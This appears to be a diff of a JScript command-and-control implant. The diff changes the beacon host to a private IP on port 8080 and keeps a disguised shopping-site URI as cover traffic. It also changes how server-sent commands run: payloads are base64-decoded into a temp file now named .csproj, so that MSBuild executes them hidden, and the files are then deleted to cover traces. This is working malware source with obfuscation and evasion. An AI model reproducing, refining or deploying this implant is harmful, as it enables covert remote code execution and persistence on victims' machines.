@@ -1,5 +1,5 @@
 //Define variables
-var ipp  = "172.16.113.1"
+var ipp  = "192.168.1.8"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -188,17 +188,17 @@ while(true)
 
           //psh and cs
           else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
-             fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
+             fd = fso.CreateTextFile(temp + "\\" + id + ".csproj")
              msb = cmnd.split(" ")[1]
              msbdata = b64d(cmnd.split(" ")[2], "txt")
              fd.WriteLine(msbdata)
              fd.close()
              if(cmnd.split(" ")[0] == "shc") {
-               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+               runner.Run(msb + " " + temp + "\\" + id + ".csproj", 0, true)
                retval = "[*] Shc cmnd appeared successful"
              }
              else {
-               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+               runner.Run(msb + " " + temp + "\\" + id + ".csproj", 0, true)
              }
              if(fso.FileExists(temp + "\\__" + id + ".txt")) {
                fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
@@ -206,8 +206,8 @@ while(true)
                fd.close()
                fso.DeleteFile(temp + "\\__" + id + ".txt", true)
              }
-             if(fso.FileExists(temp + "\\" + id + ".txt")) {
-               fso.DeleteFile(temp + "\\" + id + ".txt", true)
+             if(fso.FileExists(temp + "\\" + id + ".csproj")) {
+               fso.DeleteFile(temp + "\\" + id + ".csproj", true)
             }
           }
               
